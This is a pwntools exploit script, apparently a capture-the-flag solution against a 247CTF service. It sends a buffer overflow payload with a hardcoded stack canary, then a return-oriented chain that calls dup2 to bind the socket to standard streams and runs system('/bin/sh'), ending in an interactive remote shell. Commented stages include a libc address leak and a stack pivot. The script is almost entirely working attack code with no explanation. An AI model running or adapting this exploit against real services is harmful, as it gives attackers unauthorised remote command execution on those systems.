from pwn import *
canary = b"\x00"

#canary_tmp = canary + chr(i).encode("utf-8")

#r = remote("0.0.0.0", 5555)

# tcp://ad1e04e26c2a4242.247ctf.com:50198
r = remote("144.76.74.118", 50198)

print(r.recvuntil(b'Enter the secret password!'))

canary = b"\x00\xd0\x9d\xa9"

send = 0x80485c0
write = 0x8048550
pop_4_ret = 0x08048a68
strlen_got = 0x0804a024
vuln = 0x080486f6
main = 0x8048855
mainx = 0x80489b2
_recv = 0x80485a0
leave_ret = 0x08048665


bss = 0x0804ad00
bss2 = 0xffcb80b8

payload = b"admin123\n\x00" 
payload += b'x'*(0x200 - len(payload))
payload += canary
payload += p32(0)*2 + b"\xb8\x80\xcb\xff"
#payload += p32(write)
#payload += p32(pop_4_ret)
#payload += p32(4) + p32(0x0804a030) + p32(4) + p32(0)
#payload += p32(_recv)
#payload += p32(pop_4_ret)
#payload += p32(4) + p32(bss2) + p32(0x200) + p32(0)


libc_base = 0xf7d50000
dup2 = libc_base + 0xe6110
binsh = libc_base + 0x17b8cf
system = libc_base + 0x3cd10


payload += p32(dup2) + p32(pop_4_ret)
payload += p32(4) + p32(0)*3
payload += p32(dup2) + p32(pop_4_ret)
payload += p32(4) + p32(1) + p32(0)*2
payload += p32(dup2) + p32(pop_4_ret)
payload += p32(4) + p32(2) + p32(0)*2
payload += p32(system) + p32(0) + p32(binsh)





#payload += p32(leave_ret)
#payload += p32(bss - 4)
#payload += p32(leave_ret)


r.send(payload) 

'''
stuff = r.recvuntil(b'\xf7')[-4:]
libc_base = int.from_bytes(stuff, "little") - 0xf84b0
print(hex(libc_base))


dup2 = libc_base + 0xe6110
binsh = libc_base + 0x17b8cf
system = libc_base + 0x3cd10

'''
'''
payload2 = p32(dup2) + p32(pop_4_ret)
payload2 += p32(4) + p32(0)*3
payload2 += p32(dup2) + p32(pop_4_ret)
payload2 += p32(4) + p32(1) + p32(0)*2
payload2 += p32(dup2) + p32(pop_4_ret)
payload2 += p32(4) + p32(2) + p32(0)*2
payload2 += p32(system) + p32(0) + p32(binsh)
'''

#r.send(payload2)

#print(r.recvuntil(b'\xf7'))

r.interactive()